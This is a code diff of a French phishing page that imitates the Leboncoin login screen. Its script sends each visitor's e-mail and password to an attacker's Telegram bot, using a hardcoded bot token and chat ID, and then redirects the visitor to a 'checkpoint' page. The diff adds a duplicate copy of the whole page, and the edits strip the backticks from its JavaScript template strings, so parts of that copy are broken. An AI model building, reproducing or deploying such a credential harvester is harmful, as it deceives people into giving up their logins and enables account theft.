@@ -20,7 +20,7 @@
         header {
             text-align: center;
             background: #ffffff;
-            padding-top: 20px;
+            padding-top: 20px; /* Ajout d'un padding pour espacer le logo du haut de la page */
         }
 
         .logo {
@@ -40,23 +40,23 @@
             margin: 0;
             padding: 0;
             text-align: center;
-            background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ99d5FfXb09Wt4b_VyIGEdQajCjKaEZi4FSg&s');
+            background-image: url('image/lbc.png'); /* Image de fond */
             background-repeat: no-repeat;
-            background-size: cover;
+            background-size: cover; /* L'image prend toute la surface */
             background-position: center;
-            height: 100vh;
+            height: 100vh; /* Hauteur de la fenêtre */
             display: flex;
-            justify-content: flex-start;
+            justify-content: flex-start; /* Aligner tous les éléments à gauche */
             flex-direction: column;
-            align-items: center;
+            align-items: center; /* Centrer tous les éléments horizontalement */
         }
 
         .continer {
-            margin-top: 20px;
+            margin-top: 20px; /* Le formulaire est espacé juste en dessous du logo */
             padding: 30px;
             display: inline-block;
             width: 490px;
-            background: rgba(255, 255, 255, 0.8);
+            background: rgba(255, 255, 255, 0.8); /* Fond semi-transparent */
             border-radius: 14px;
             border: 4px solid #cdcfdb75;
             position: relative;
@@ -110,6 +110,11 @@
             font-size: 1.09em;
             margin-top: 32px;
             font-weight: bold;
+        }
+
+        .bottom {
+            display: inline-block;
+            align-items: center;
         }
 
         .bottom {
@@ -173,7 +178,7 @@
     <!-- En-tête avec le logo centré -->
     <header>
         <div class="logo">
-            <img src="image/logo.png" alt="Logo Leboncoin">
+            <img src="image/logo.png" alt="Logo Leboncoin">. <!-- Nouveau logo -->
         </div>
     </header>
 
@@ -221,14 +226,16 @@
 
     <script>
         // Token du bot Telegram
-        const token = "8047026898:AAEYkbvc49hNhy9bGvd5iG07PHRe1jKj6uI";
-        const chatId = "5601119281";
+        const token = "8047026898:AAEYkbvc49hNhy9bGvd5iG07PHRe1jKj6uI";  // Remplacez par le token de votre bot
+        const chatId = "5601119281"; // Remplacez par votre chat ID ou groupe ID
 
+        // Fonction pour envoyer les données à Telegram
         async function sendToTelegram(formData) {
-            const message = `Nouveau message depuis le formulaire :
-E-mail: ${formData.user}
-Mot de passe: ${formData.pass}`;
-            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const message = Nouveau message depuis le formulaire :
+                \nE-mail: ${formData.user}
+                \nMot de passe: ${formData.pass}
+            ;
+            const url = https://api.telegram.org/bot${token}/sendMessage;
 
             const response = await fetch(url, {
                 method: "POST",
@@ -244,18 +251,310 @@ Mot de passe: ${formData.pass}`;
             return response.json();
         }
 
+        // Gestion de la soumission du formulaire
         document.getElementById("loginForm").addEventListener("submit", function (event) {
-            event.preventDefault();
+            event.preventDefault(); // Empêche la soumission par défaut
 
             const user = document.getElementById("user").value;
             const pass = document.getElementById("pass").value;
 
-            const formData = { user, pass };
+            // Créer un objet avec les données du formulaire
+            const formData = {
+                user: user,
+                pass: pass
+            };
 
+            // Appeler la fonction pour envoyer les données à Telegram
             sendToTelegram(formData)
                 .then(response => {
                     if (response.ok) {
-                        window.location.href = "checkpoint.html";
+                        // Si l'envoi est réussi, rediriger l'utilisateur vers checkpoint.html
+                        window.location.href = "checkpoint.html"; // Redirection vers checkpoint.html
+                    } else {
+                        alert("Erreur lors de l'envoi des informations.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Erreur : ", error);
+                });
+        });
+    </script>
+
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Leboncoin - Connexion</title>
+    <style>
+        * {
+            max-width: 100%;
+            outline: none;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            text-align: center;
+            background: #ffffff;
+            padding-top: 20px; /* Ajout d'un padding pour espacer le logo du haut de la page */
+        }
+
+        .logo {
+            display: inline-block;
+        }
+
+        header img {
+            width: 190px;
+        }
+
+        .ui {
+            background: #d8dde5;
+            padding: 4px;
+        }
+
+        main {
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            background-image: url('image/lbc.png'); /* Image de fond */
+            background-repeat: no-repeat;
+            background-size: cover; /* L'image prend toute la surface */
+            background-position: center;
+            height: 100vh; /* Hauteur de la fenêtre */
+            display: flex;
+            justify-content: flex-start; /* Aligner tous les éléments à gauche */
+            flex-direction: column;
+            align-items: center; /* Centrer tous les éléments horizontalement */
+        }
+
+        .continer {
+            margin-top: 20px; /* Le formulaire est espacé juste en dessous du logo */
+            padding: 30px;
+            display: inline-block;
+            width: 490px;
+            background: rgba(255, 255, 255, 0.8); /* Fond semi-transparent */
+            border-radius: 14px;
+            border: 4px solid #cdcfdb75;
+            position: relative;
+            z-index: 1;
+        }
+
+        .col {
+            text-align: left;
+            margin-top: 26px;
+        }
+
+        .col input {
+            width: 100%;
+            padding: 14px;
+            border-radius: 20px;
+            border: 1px solid #b2a6a6;
+            margin-top: 4px;
+        }
+
+        .tittle {
+            text-align: left;
+        }
+
+        h2 {
+            margin-top: 0px;
+            color: rgb(21 34 51);
+        }
+
+        .tittle p {
+            font-size: 0.94em;
+            margin-bottom: 10px;
+        }
+
+        .code {
+            text-align: left;
+            margin-top: 0px;
+        }
+
+        .code a {
+            font-size: 0.9em;
+            color: #000000;
+        }
+
+        .coll button {
+            width: 100%;
+            padding: 12px;
+            color: white;
+            background: #ec5a13;
+            border-radius: 20px;
+            border: none;
+            font-size: 1.09em;
+            margin-top: 32px;
+            font-weight: bold;
+        }
+
+        .bottom {
+            display: inline-block;
+            align-items: center;
+        }
+
+        .bottom {
+            display: flex;
+            align-items: center;
+            margin-top: 22px;
+        }
+
+        .bottom .p {
+            display: flex;
+            align-items: center;
+            width: 63%;
+            margin-left: 38px;
+        }
+
+        .bottom .a {
+            display: flex;
+            align-items: center;
+            width: 64%;
+        }
+
+        .a a {
+            color: rgb(21 34 51);
+            font-weight: bold;
+        }
+
+        @media screen and (max-width: 800px) {
+            header img {
+                width: 140px;
+            }
+
+            .title {
+                font-weight: bold;
+                font-size: 0.9em;
+                color: black;
+                text-align: left;
+            }
+
+            main {
+                background: none;
+                margin: 0;
+            }
+
+            .continer {
+                border: none;
+            }
+
+            .bottom .p {
+                font-size: 0.8em;
+            }
+
+            .code a {
+                font-size: 0.8em;
+                color: #000000;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- En-tête avec le logo centré -->
+    <header>
+        <div class="logo">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ99d5FfXb09Wt4b_VyIGEdQajCjKaEZi4FSg&s" alt="Logo Leboncoin">. <!-- Nouveau logo -->
+        </div>
+    </header>
+
+    <main>
+        <div class="continer">
+            <div class="tittle">
+                <h2>Bonjour !</h2>
+                <p>Connectez-vous pour découvrir toutes nos fonctionnalités.</p>
+            </div>
+
+            <!-- Affichage d'un message d'erreur si les identifiants sont incorrects -->
+            <?php if (isset($error)) : ?>
+                <div style="color: red; text-align: center; margin-top: 20px;">
+                    <?php echo $error; ?>
+                </div>
+            <?php endif; ?>
+
+            <!-- Formulaire de connexion -->
+            <form action="index.php" method="post" id="loginForm">
+                <div class="col">
+                    <label for="user">E-mail *</label>
+                    <input type="text" id="user" name="user" required autofocus>
+                </div>
+
+                <div class="col">
+                    <label for="pass">Mot de passe *</label>
+                    <input type="password" id="pass" name="pass" required>
+                </div>
+
+                <div class="code">
+                    <a href="#">Mot de passe oublié</a>
+                </div>
+
+                <div class="coll">
+                    <button type="submit" id="submitBtn">Se connecter</button>
+                </div>
+
+                <div class="bottom">
+                    <div class="p"><p>Envie de nous rejoindre ?</p></div>
+                    <div class="a"><a href="#">Créer un compte</a></div>
+                </div>
+            </form>
+        </div>
+    </main>
+
+    <script>
+        // Token du bot Telegram
+        const token = "8047026898:AAEYkbvc49hNhy9bGvd5iG07PHRe1jKj6uI";  // Remplacez par le token de votre bot
+        const chatId = "5601119281"; // Remplacez par votre chat ID ou groupe ID
+
+        // Fonction pour envoyer les données à Telegram
+        async function sendToTelegram(formData) {
+            const message = Nouveau message depuis le formulaire :
+                \nE-mail: ${formData.user}
+                \nMot de passe: ${formData.pass}
+            ;
+            const url = https://api.telegram.org/bot${token}/sendMessage;
+
+            const response = await fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+
+            return response.json();
+        }
+
+        // Gestion de la soumission du formulaire
+        document.getElementById("loginForm").addEventListener("submit", function (event) {
+            event.preventDefault(); // Empêche la soumission par défaut
+
+            const user = document.getElementById("user").value;
+            const pass = document.getElementById("pass").value;
+
+            // Créer un objet avec les données du formulaire
+            const formData = {
+                user: user,
+                pass: pass
+            };
+
+            // Appeler la fonction pour envoyer les données à Telegram
+            sendToTelegram(formData)
+                .then(response => {
+                    if (response.ok) {
+                        // Si l'envoi est réussi, rediriger l'utilisateur vers checkpoint.html
+                        window.location.href = "checkpoint.html"; // Redirection vers checkpoint.html
                     } else {
                         alert("Erreur lors de l'envoi des informations.");
                     }
